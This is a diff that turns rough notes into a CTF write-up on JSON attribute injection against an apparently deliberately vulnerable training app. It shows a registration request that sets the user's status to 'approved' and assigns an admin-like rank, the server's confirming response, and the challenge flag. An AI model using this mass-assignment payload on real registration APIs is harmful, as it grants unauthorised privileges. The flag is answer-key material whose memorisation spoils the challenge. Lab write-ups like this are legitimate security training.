@@ -1,7 +1,12 @@
-Json attribute injection:
+# CTF Writeup: JSON Attribute Injection
 
-We can set the status of the registration:
+## Challenge: JSON Attribute Injection
 
+### Exploit:
+The registration API allowed injecting attributes to set user status to approved.
+
+### Request:
+```
 POST /api/register HTTP/2
 Host: juice-shop-vopb.onrender.com
 Content-Length: 152
@@ -24,9 +29,10 @@ Priority: u=1, i
 
 {"attributes":{"email":"s@m.com","missionReason":"hack",
 "status":"approved"},"relationships":{"ranks":{"data":[{"type":"rank","id":"fleetAdmiral"}]}}}
+```
 
-
-ResponsE:
+### Response:
+```
 HTTP/2 201 Created
 Date: Wed, 26 Mar 2025 03:41:44 GMT
 Content-Type: application/json
@@ -40,9 +46,10 @@ Cf-Ray: 9263a24edc238b0f-BOM
 Alt-Svc: h3=":443"; ma=86400
 
 {"message":"Registration created","status":"approved","user_id":"dd9f55e9-70cb-42e2-b30d-05a99f6876ba"}
+```
 
-
-Login:
-Flag:
-
+### Flag:
+```
 CTF{straw_hat_admin_bypass}
+```
+
